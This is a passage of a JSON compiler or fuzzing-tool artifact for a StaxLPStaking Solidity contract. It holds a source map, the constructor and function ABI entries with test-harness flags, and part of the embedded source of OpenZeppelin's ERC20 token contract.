27;-1:-1:-1;4814:27:1::1;4806:64;;;::::0;-1:-1:-1;;;4806:64:1;;6959:2:29;4806:64:1::1;::::0;::::1;6941:21:29::0;6998:2;6978:18;;;6971:30;7037:26;7017:18;;;7010:54;7081:18;;4806:64:1::1;6757:348:29::0;4806:64:1::1;4897:6;4881:12;;:22;;;;;;;:::i;:::-;::::0;;;-1:-1:-1;;;;;;;4913:17:1;::::1;;::::0;;;:9:::1;:17;::::0;;;;:27;;4934:6;;4913:17;:27:::1;::::0;4934:6;;4913:27:::1;:::i;:::-;::::0;;;-1:-1:-1;;4951:12:1::1;::::0;:44:::1;::::0;-1:-1:-1;;;;;4951:12:1::1;4977:9:::0;4988:6;4951:25:::1;:44::i;:::-;5010:36;::::0;;-1:-1:-1;;;;;5917:32:29;;;5899:51;;5981:2;5966:18;;5959:34;;;5010:36:1;::::1;::::0;::::1;::::0;5872:18:29;5010:36:1::1;;;;;;;5066:12;5062:149;;;5163:37;5175:6;5183:16;5163:11;:37::i;:::-;4552:665:::0;;;;;;:::o;3504:332::-;-1:-1:-1;;;;;3788:26:1;;;3633:7;3788:26;;;:16;:26;;;;;;;;:41;;;;;;;;;;;;;3717:32;;;:22;:32;;;;;:47;;;;;;;;;;3769:4;;3684:30;3815:13;3684:15;:30::i;:::-;:80;;;;:::i;:::-;3672:93;;:8;:93;:::i;:::-;3671:102;;;;:::i;:::-;:158;;;;:::i;:::-;3652:177;;3504:332;;;;;;:::o;1359:130:4:-;1247:7;1273:6;-1:-1:-1;;;;;1273:6:4;719:10:11;1422:23:4;1414:68;;;;-1:-1:-1;;;1414:68:4;;7970:2:29;1414:68:4;;;7952:21:29;;;7989:18;;;7982:30;8048:34;8028:18;;;8021:62;8100:18;;1414:68:4;7768:356:29;974:241:9;1139:68;;-1:-1:-1;;;;;8387:15:29;;;1139:68:9;;;8369:34:29;8439:15;;8419:18;;;8412:43;8471:18;;;8464:34;;;1112:96:9;;1132:5;;-1:-1:-1;;;1162:27:9;8304:18:29;;1139:68:9;;;;-1:-1:-1;;1139:68:9;;;;;;;;;;;;;;-1:-1:-1;;;;;1139:68:9;-1:-1:-1;;;;;;1139:68:9;;;;;;;;;;1112:19;:96::i;:::-;974:241;;;;:::o;4354:192:1:-;4428:4;9781:9;9776:600;9800:12;:19;9796:23;;9776:600;;;9844:13;9860:12;9873:1;9860:15;;;;;;;;:::i;:::-;;;;;;;;;;;-1:-1:-1;;;;;9860:15:1;;-1:-1:-1;9942:22:1;9860:15;9942;:22::i;:::-;-1:-1:-1;;;;;9893:17:1;;;;;;:10;:17;;;;;:38;;;:72;;-1:-1:-1;;;;;9893:72:1;;;;-1:-1:-1;;;9893:72:1;;;;;;;;10051:30;10025:57;;10051:30;10025:25;:57::i;:::-;-1:-1:-1;;;;;9983:17:1;;;;;;;:10;:17;;;;;:32;;:100;;-1:-1:-1;;9983:100:1;;;;;;;;;;;;;10105:22;;;10101:261;;-1:-1:-1;;;;;10212:19:1;;;;;;:9;:19;;;;;;10187:45;;10195:8;;10205:5;;10187:7;:45::i;:::-;-1:-1:-1;;;;;10151:26:1;;;;;;;:16;:26;;;;;;;;:33;;;;;;;;;;;;:81;;;;10304:10;:17;;;;;:38;;;10254:32;;;:22;:32;;;;;:39;;;;;;;;;;-1:-1:-1;;;10304:38:1;;;-1:-1:-1;;;;;10304:38:1;10254:89;;10101:261;-1:-1:-1;9821:3:1;;;;:::i;:::-;;;;9776:600;;;;4460:7:::1;4444:12;;:23;;;;;;;:::i;:::-;::::0;;;-1:-1:-1;;;;;;;4477:15:1;::::1;;::::0;;;:9:::1;:15;::::0;;;;:26;;4496:7;;4477:15;:26:::1;::::0;4496:7;;4477:26:::1;:::i;:::-;::::0;;;-1:-1:-1;;4518:21:1::1;::::0;160:25:29;;;-1:-1:-1;;;;;4518:21:1;::::1;::::0;::::1;::::0;148:2:29;133:18;4518:21:1::1;;;;;;;4354:192:::0;;;:::o;2538:513::-;2609:7;2632:13;2064:12;;;1994:89;2632:13;2649:1;2632:18;2628:102;;-1:-1:-1;;;;;;2673:25:1;;;;;:10;:25;;;;;:46;;;-1:-1:-1;;;2673:46:1;;-1:-1:-1;;;;;2673:46:1;;2538:513::o;2628:102::-;2064:12;;-1:-1:-1;;;;;2967:25:1;;;;;;:10;:25;;;;;:36;;2907:40;;;;;-1:-1:-1;;;;;;;;2967:36:1;;;;2907:40;;;;;2823:65;;2849:38;2823:25;:65::i;:::-;:124;;;;:::i;:::-;2822:181;;;;:::i;:::-;:188;;3006:4;2822:188;:::i;:::-;2821:222;;;;:::i;:::-;-1:-1:-1;;;;;2759:25:1;;;;;;:10;:25;;;;;:46;;;:285;;;-1:-1:-1;;;2759:46:1;;-1:-1:-1;;;;;2759:46:1;:285;:::i;6478:214::-;6557:7;6594:15;6580:11;:29;6576:78;;;-1:-1:-1;6632:11:1;6478:214::o;6576:78::-;-1:-1:-1;6670:15:1;;6478:214;-1:-1:-1;6478:214:1:o;6069:403::-;-1:-1:-1;;;;;6188:24:1;;;6171:14;6188:24;;;:16;:24;;;;;;;;:37;;;;;;;;;;6239:10;;6235:231;;-1:-1:-1;;;;;6265:24:1;;;6305:1;6265:24;;;:16;:24;;;;;;;;:37;;;;;;;;;;;;:41;6320:58;;6353:16;6371:6;6320:32;:58::i;:::-;6398:57;;;-1:-1:-1;;;;;8387:15:29;;;8369:34;;8439:15;;;8434:2;8419:18;;8412:43;8471:18;;;8464:34;;;6398:57:1;;;;;;8319:2:29;8304:18;6398:57:1;;;;;;;6161:311;6069:403;;;:::o;2433:187:4:-;2506:16;2525:6;;-1:-1:-1;;;;;2541:17:4;;;-1:-1:-1;;;;;;2541:17:4;;;;;;2573:40;;2525:6;;;;;;;2573:40;;2506:16;2573:40;2496:124;2433:187;:::o;5703:212:1:-;5790:9;5785:124;5805:12;:19;5801:23;;5785:124;;;5845:53;5856:6;5864:12;5877:1;5864:15;;;;;;;;:::i;:::-;;;;;;;;;;;-1:-1:-1;;;;;5864:15:1;5881:16;5845:10;:53::i;:::-;5826:3;;;;:::i;:::-;;;;5785:124;;6698:613;-1:-1:-1;;;;;6803:25:1;;6780:20;6803:25;;;:10;:25;;;;;6862:18;;;;6843:15;:37;6839:344;;6923:18;586:9;6923:7;:18;:::i;:::-;6896:46;;-1:-1:-1;;;;;6896:46:1;;;;-1:-1:-1;;;6896:46:1;;;;;;;;6839:344;;;7001:18;;6973:17;;6993:45;;7023:15;;7001:18;;6993:45;:::i;:::-;7083:16;;6973:65;;-1:-1:-1;7052:16:1;;7071:28;;-1:-1:-1;;;7083:16:1;;-1:-1:-1;;;;;7083:16:1;6973:65;7071:28;:::i;:::-;7052:47;-1:-1:-1;586:9:1;7141:18;7052:47;7141:7;:18;:::i;:::-;7140:31;;;;:::i;:::-;7113:59;;-1:-1:-1;;;;;7113:59:1;;;;-1:-1:-1;;;7113:59:1;;;;;;;;-1:-1:-1;;6839:344:1;7193:20;;;:46;;-1:-1:-1;;7193:46:1;7223:15;7193:46;;;;;;;;;;7277:26;;586:9;;7277:26;:::i;:::-;7249:55;;-1:-1:-1;;7249:55:1;;;;;;;;;-1:-1:-1;;6698:613:1:o;763:205:9:-;902:58;;-1:-1:-1;;;;;5917:32:29;;902:58:9;;;5899:51:29;5966:18;;;5959:34;;;875:86:9;;895:5;;-1:-1:-1;;;925:23:9;5872:18:29;;902:58:9;5725:274:29;3747:706:9;4166:23;4192:69;4220:4;4192:69;;;;;;;;;;;;;;;;;4200:5;-1:-1:-1;;;;;4192:27:9;;;:69;;;;;:::i;:::-;4275:17;;4166:95;;-1:-1:-1;4275:21:9;4271:176;;4370:10;4359:30;;;;;;;;;;;;:::i;:::-;4351:85;;;;-1:-1:-1;;;4351:85:9;;8961:2:29;4351:85:9;;;8943:21:29;9000:2;8980:18;;;8973:30;9039:34;9019:18;;;9012:62;-1:-1:-1;;;9090:18:29;;;9083:40;9140:19;;4351:85:9;8759:406:29;3861:223:10;3994:12;4025:52;4047:6;4055:4;4061:1;4064:12;3994;-1:-1:-1;;;;;1465:19:10;;;5228:60;;;;-1:-1:-1;;;5228:60:10;;9779:2:29;5228:60:10;;;9761:21:29;9818:2;9798:18;;;9791:30;9857:31;9837:18;;;9830:59;9906:18;;5228:60:10;9577:353:29;5228:60:10;5300:12;5314:23;5341:6;-1:-1:-1;;;;;5341:11:10;5360:5;5367:4;5341:31;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;5299:73;;;;5389:51;5406:7;5415:10;5427:12;5389:16;:51::i;:::-;5382:58;4948:499;-1:-1:-1;;;;;;;4948:499:10:o;7561:742::-;7707:12;7735:7;7731:566;;;-1:-1:-1;7765:10:10;7758:17;;7731:566;7876:17;;:21;7872:415;;8120:10;8114:17;8180:15;8167:10;8163:2;8159:19;8152:44;7872:415;8259:12;8252:20;;-1:-1:-1;;;8252:20:10;;;;;;;;:::i;196:118:29:-;282:5;275:13;268:21;261:5;258:32;248:60;;304:1;301;294:12;319:241;375:6;428:2;416:9;407:7;403:23;399:32;396:52;;;444:1;441;434:12;396:52;483:9;470:23;502:28;524:5;502:28;:::i;565:173::-;633:20;;-1:-1:-1;;;;;682:31:29;;672:42;;662:70;;728:1;725;718:12;662:70;565:173;;;:::o;743:260::-;811:6;819;872:2;860:9;851:7;847:23;843:32;840:52;;;888:1;885;878:12;840:52;911:29;930:9;911:29;:::i;:::-;901:39;;959:38;993:2;982:9;978:18;959:38;:::i;:::-;949:48;;743:260;;;;;:::o;1008:186::-;1067:6;1120:2;1108:9;1099:7;1095:23;1091:32;1088:52;;;1136:1;1133;1126:12;1088:52;1159:29;1178:9;1159:29;:::i;1398:254::-;1466:6;1474;1527:2;1515:9;1506:7;1502:23;1498:32;1495:52;;;1543:1;1540;1533:12;1495:52;1566:29;1585:9;1566:29;:::i;:::-;1556:39;1642:2;1627:18;;;;1614:32;;-1:-1:-1;;;1398:254:29:o;1657:309::-;1722:6;1730;1783:2;1771:9;1762:7;1758:23;1754:32;1751:52;;;1799:1;1796;1789:12;1751:52;1835:9;1822:23;1812:33;;1895:2;1884:9;1880:18;1867:32;1908:28;1930:5;1908:28;:::i;:::-;1955:5;1945:15;;;1657:309;;;;;:::o;2691:180::-;2750:6;2803:2;2791:9;2782:7;2778:23;2774:32;2771:52;;;2819:1;2816;2809:12;2771:52;-1:-1:-1;2842:23:29;;2691:180;-1:-1:-1;2691:180:29:o;3768:127::-;3829:10;3824:3;3820:20;3817:1;3810:31;3860:4;3857:1;3850:15;3884:4;3881:1;3874:15;3900:127;3961:10;3956:3;3952:20;3949:1;3942:31;3992:4;3989:1;3982:15;4016:4;4013:1;4006:15;4032:135;4071:3;4092:17;;;4089:43;;4112:18;;:::i;:::-;-1:-1:-1;4159:1:29;4148:13;;4032:135::o;4172:184::-;4242:6;4295:2;4283:9;4274:7;4270:23;4266:32;4263:52;;;4311:1;4308;4301:12;4263:52;-1:-1:-1;4334:16:29;;4172:184;-1:-1:-1;4172:184:29:o;7110:128::-;7177:9;;;7198:11;;;7195:37;;;7212:18;;:::i;7243:168::-;7316:9;;;7347;;7364:15;;;7358:22;;7344:37;7334:71;;7385:18;;:::i;7416:217::-;7456:1;7482;7472:132;;7526:10;7521:3;7517:20;7514:1;7507:31;7561:4;7558:1;7551:15;7589:4;7586:1;7579:15;7472:132;-1:-1:-1;7618:9:29;;7416:217::o;7638:125::-;7703:9;;;7724:10;;;7721:36;;;7737:18;;:::i;8509:245::-;8576:6;8629:2;8617:9;8608:7;8604:23;8600:32;8597:52;;;8645:1;8642;8635:12;8597:52;8677:9;8671:16;8696:28;8718:5;8696:28;:::i;9935:250::-;10020:1;10030:113;10044:6;10041:1;10038:13;10030:113;;;10120:11;;;10114:18;10101:11;;;10094:39;10066:2;10059:10;10030:113;;;-1:-1:-1;;10177:1:29;10159:16;;10152:27;9935:250::o;10190:287::-;10319:3;10357:6;10351:13;10373:66;10432:6;10427:3;10420:4;10412:6;10408:17;10373:66;:::i;:::-;10455:16;;;;;10190:287;-1:-1:-1;;10190:287:29:o;10482:396::-;10631:2;10620:9;10613:21;10594:4;10663:6;10657:13;10706:6;10701:2;10690:9;10686:18;10679:34;10722:79;10794:6;10789:2;10778:9;10774:18;10769:2;10761:6;10757:15;10722:79;:::i;:::-;10862:2;10841:15;-1:-1:-1;;10837:29:29;10822:45;;;;10869:2;10818:54;;10482:396;-1:-1:-1;;10482:396:29:o","constructor":{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:constructor","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","inputs":[{"name":"_stakingToken","kind":"Address","internalType":"address"},{"name":"_distributor","kind":"Address","internalType":"address"}]},"functions":[{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:DURATION()(uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"DURATION():(uint256)","shortSignature":"1be05289","name":"DURATION","inputs":[],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:addReward(address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"addReward(address)","shortSignature":"9c9b2e21","name":"addReward","inputs":[{"name":"_rewardToken","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:balanceOf(address)(uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"balanceOf(address):(uint256)","shortSignature":"70a08231","name":"balanceOf","inputs":[{"name":"account","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:claimableRewards(address,address)(uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"claimableRewards(address,address):(uint256)","shortSignature":"6be9dcce","name":"claimableRewards","inputs":[{"name":"","kind":"Address","internalType":"address"},{"name":"","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:earned(address,address)(uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"earned(address,address):(uint256)","shortSignature":"211dc32d","name":"earned","inputs":[{"name":"_account","kind":"Address","internalType":"address"},{"name":"_rewardsToken","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:getReward(address,address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"getReward(address,address)","shortSignature":"6b091695","name":"getReward","inputs":[{"name":"staker","kind":"Address","internalType":"address"},{"name":"rewardToken","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:getRewards(address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"getRewards(address)","shortSignature":"79ee54f7","name":"getRewards","inputs":[{"name":"staker","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:migrateStake(address,uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"migrateStake(address,uint256)","shortSignature":"bdcd9c80","name":"migrateStake","inputs":[{"name":"oldStaking","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:migrateWithdraw(address,uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"migrateWithdraw(address,uint256)","shortSignature":"3c24436c","name":"migrateWithdraw","inputs":[{"name":"staker","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:migrator()(address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"migrator():(address)","shortSignature":"7cd07e47","name":"migrator","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"address"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:notifyRewardAmount(address,uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"notifyRewardAmount(address,uint256)","shortSignature":"b66503cf","name":"notifyRewardAmount","inputs":[{"name":"_rewardsToken","kind":"Address","internalType":"address"},{"name":"_amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:owner()(address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"owner():(address)","shortSignature":"8da5cb5b","name":"owner","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"address"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:renounceOwnership()","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"renounceOwnership()","shortSignature":"715018a6","name":"renounceOwnership","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:rewardData(address)(uint40,uint216,uint40,uint216)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"rewardData(address):(uint40,uint216,uint40,uint216)","shortSignature":"48e5d9f8","name":"rewardData","inputs":[{"name":"","kind":"Address","internalType":"address"}],"outputs":[{"name":"periodFinish","kind":{"Uint":40},"internalType":"uint40"},{"name":"rewardRate","kind":{"Uint":216},"internalType":"uint216"},{"name":"lastUpdateTime","kind":{"Uint":40},"internalType":"uint40"},{"name":"rewardPerTokenStored","kind":{"Uint":216},"internalType":"uint216"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:rewardDistributor()(address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"rewardDistributor():(address)","shortSignature":"acc2166a","name":"rewardDistributor","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"address"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:rewardPerToken(address)(uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"rewardPerToken(address):(uint256)","shortSignature":"f1229777","name":"rewardPerToken","inputs":[{"name":"_rewardsToken","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:rewardPeriodFinish(address)(uint40)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"rewardPeriodFinish(address):(uint40)","shortSignature":"2e297072","name":"rewardPeriodFinish","inputs":[{"name":"_token","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":40},"internalType":"uint40"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:rewardTokens(uint256)(address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"rewardTokens(uint256):(address)","shortSignature":"7bb7bed1","name":"rewardTokens","inputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Address","internalType":"address"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:setMigrator(address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"setMigrator(address)","shortSignature":"23cf3118","name":"setMigrator","inputs":[{"name":"_migrator","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:setRewardDistributor(address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"setRewardDistributor(address)","shortSignature":"a1809b95","name":"setRewardDistributor","inputs":[{"name":"_distributor","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:stake(uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"stake(uint256)","shortSignature":"a694fc3a","name":"stake","inputs":[{"name":"_amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:stakeAll()","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"stakeAll()","shortSignature":"8dcb4061","name":"stakeAll","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:stakeFor(address,uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"stakeFor(address,uint256)","shortSignature":"2ee40908","name":"stakeFor","inputs":[{"name":"_for","kind":"Address","internalType":"address"},{"name":"_amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:stakingToken()(address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"stakingToken():(address)","shortSignature":"72f702f3","name":"stakingToken","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"contract IERC20"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:totalSupply()(uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"totalSupply():(uint256)","shortSignature":"18160ddd","name":"totalSupply","inputs":[],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:transferOwnership(address)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"transferOwnership(address)","shortSignature":"f2fde38b","name":"transferOwnership","inputs":[{"name":"newOwner","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:userRewardPerTokenPaid(address,address)(uint256)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"userRewardPerTokenPaid(address,address):(uint256)","shortSignature":"7035ab98","name":"userRewardPerTokenPaid","inputs":[{"name":"","kind":"Address","internalType":"address"},{"name":"","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:withdraw(uint256,bool)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"withdraw(uint256,bool)","shortSignature":"38d07436","name":"withdraw","inputs":[{"name":"amount","kind":{"Uint":256},"internalType":"uint256"},{"name":"claim","kind":"Bool","internalType":"bool"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLPStaking.sol:StaxLPStaking:withdrawAll(bool)","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","signature":"withdrawAll(bool)","shortSignature":"1c1c6fe5","name":"withdrawAll","inputs":[{"name":"claim","kind":"Bool","internalType":"bool"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false}],"functionalLines":[0,16,20,21,23,26,29,30,31,34,56,57,59,62,63,66,67,70,71,72,73,74,77,78,79,83,84,85,86,90,91,94,95,98,99,102,106,107,108,109,112,113,116,117,118,121,122,125,126,129,130,131,132,135,141,142,143,145,146,148,149,151,153,157,158,161,162,165,166,170,171,172,176,177,180,181,182,183,184,186,190,191,192,194,197,198,200,201,203,204,205,208,209,212,215,216,217,218,220,222,224,227,228,229,241,242,243,255,256,260,267,268,269,270,271,272,273]},{"name":"ERC20","artifactPath":"out/ERC20.sol/ERC20.json","sourcePath":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol","contractId":"node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol:ERC20","sourceFileId":5,"sourceContent":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\nimport \"./extensions/IERC20Metadata.sol\";\nimport \"../../utils/Context.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * The default value of {decimals} is 18. To select a different value for\n     * {decimals} you should overload it.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\n     * overridden;\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     